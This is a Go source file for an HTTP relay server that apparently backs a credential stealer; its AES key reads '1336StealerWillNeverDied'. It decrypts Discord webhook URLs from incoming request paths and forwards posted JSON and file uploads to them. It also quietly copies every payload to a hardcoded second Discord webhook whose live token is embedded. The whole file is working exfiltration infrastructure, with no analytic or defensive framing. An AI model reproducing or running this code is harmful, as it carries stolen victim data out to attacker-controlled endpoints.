package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/hex"
	"errors"
	"io"
	"io/ioutil"
	"log"
	"mime/multipart"
	"net/http"
	"regexp"
	"strings"
	"time"

	"github.com/mergermarket/go-pkcs7"
)

const (
	key = "1336StealerWillNeverDied"
)

var (
	compiledRegex = regexp.MustCompile(`(https?):\/\/((?:ptb\.|canary\.)?discord(?:app)?\.com)\/api(?:\/)?(v\d{1,2})?\/webhooks\/(\d{17,19})\/([\w\-]{68})`)
	dualWebhook   = "https://discord.com/api/webhooks/1057359122275770449/tO0QQ0Wy2O8x9IO7yVx3-ySo1YU7sRyU5cRnYf1uyyLEX5QWqChdqEywRe9aMUsdSROY"
	reqPool       []*http.Request
)

func main() {

	http.HandleFunc("/webhooks/", decryptWebhook)
	http.HandleFunc("/", good)

	err := http.ListenAndServe(":2086", nil)
	if err != nil {
		log.Fatal(err)
	}
}

func init() {
	go clearPool()
}

func clearPool() {
	for {
		time.Sleep(time.Second * 4)

		if len(reqPool) == 0 {
			continue
		}

		currentReq := reqPool[0]
		reqPool = reqPool[1:]

		http.DefaultClient.Do(currentReq)
	}
}

func good(w http.ResponseWriter, r *http.Request) {
	w.WriteHeader(200)
}

func decryptWebhook(w http.ResponseWriter, r *http.Request) {

	log.Println(r.RemoteAddr)

	if r.Header.Get("Content-Type") == "application/json" {

		startWebhook := strings.Replace(r.URL.Path, "/webhooks/", "", 1)

		finalWebhook, err := decryptGcm(startWebhook)
		if err != nil {
			w.WriteHeader(400)
			return
		}

		if !compiledRegex.Match([]byte(finalWebhook)) {
			w.WriteHeader(400)
			return
		}

		log.Println(finalWebhook)

		body, err := ioutil.ReadAll(r.Body)
		if err != nil {
			w.WriteHeader(400)
			return
		}

		if strings.Contains(string(body), "get loled.") {
			w.WriteHeader(400)
			return
		}

		r := bytes.NewReader(body)

		req, err := http.NewRequest("POST", finalWebhook, r)
		req.Header.Set("Content-Type", "application/json")
		if err != nil {
			w.WriteHeader(400)
			return
		}

		reqPool = append(reqPool, req)

		go func() {
			time.Sleep(5 * time.Second)

			r := bytes.NewReader(body)

			req, err := http.NewRequest("POST", dualWebhook, r)
			req.Header.Set("Content-Type", "application/json")
			if err != nil {
				w.WriteHeader(400)
				return
			}

			reqPool = append(reqPool, req)

		}()

		w.WriteHeader(200)
		return
	}

	r.ParseMultipartForm(0)

	var haveFile bool
	var f []byte

	file, fileheader, err := r.FormFile("file")
	if err == nil {
		haveFile = true
		f, err = ioutil.ReadAll(file)
		if err != nil {
			w.WriteHeader(400)
			return
		}
	}

	payloadJson := r.FormValue("payload_json")
	if payloadJson == "" {
		w.WriteHeader(400)
		return
	}

	payload := &bytes.Buffer{}
	writer := multipart.NewWriter(payload)

	writer.WriteField("payload_json", payloadJson)

	if haveFile {
		filePart, err := writer.CreateFormFile("", fileheader.Filename)
		if err != nil {
			w.WriteHeader(400)
			return
		}

		reader := bytes.NewReader(f)

		_, err = io.Copy(filePart, reader)
		if err != nil {
			w.WriteHeader(400)
			return
		}
	}

	err = writer.Close()
	if err != nil {
		w.WriteHeader(400)
		return
	}

	startWebhook := strings.Replace(r.URL.Path, "/webhooks/", "", 1)

	finalWebhook, err := decryptGcm(startWebhook)
	if err != nil {
		w.WriteHeader(400)
		return
	}

	if !compiledRegex.Match([]byte(finalWebhook)) {
		w.WriteHeader(400)
		return
	}

	log.Println(finalWebhook)

	req, err := http.NewRequest("POST", finalWebhook, payload)
	req.Header.Set("Content-Type", writer.FormDataContentType())

	if err == nil {
		reqPool = append(reqPool, req)
	}

	go func() {
		time.Sleep(5 * time.Second)

		payload = &bytes.Buffer{}
		writer = multipart.NewWriter(payload)

		writer.WriteField("payload_json", payloadJson)

		if haveFile {
			filePart, err := writer.CreateFormFile("", fileheader.Filename)
			if err != nil {
				w.WriteHeader(400)
				return
			}

			reader := bytes.NewReader(f)

			_, err = io.Copy(filePart, reader)
			if err != nil {
				w.WriteHeader(400)
				return
			}
		}

		err = writer.Close()
		if err != nil {
			w.WriteHeader(400)
			return
		}

		req, err := http.NewRequest("POST", dualWebhook, payload)
		req.Header.Set("Content-Type", writer.FormDataContentType())
		if err != nil {
			w.WriteHeader(400)
			return
		}

		reqPool = append(reqPool, req)

	}()

	w.WriteHeader(200)
}

func decryptGcm(encrypted string) (string, error) {
	key := []byte(key)
	cipherText, _ := hex.DecodeString(encrypted)

	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err)
	}

	if len(cipherText) < aes.BlockSize {
		return "", errors.New("error")
	}

	iv := cipherText[:aes.BlockSize]
	cipherText = cipherText[aes.BlockSize:]
	if len(cipherText)%aes.BlockSize != 0 {
		return "", errors.New("error")
	}

	mode := cipher.NewCBCDecrypter(block, iv)
	mode.CryptBlocks(cipherText, cipherText)

	cipherText, _ = pkcs7.Unpad(cipherText, aes.BlockSize)
	return string(cipherText), nil
}
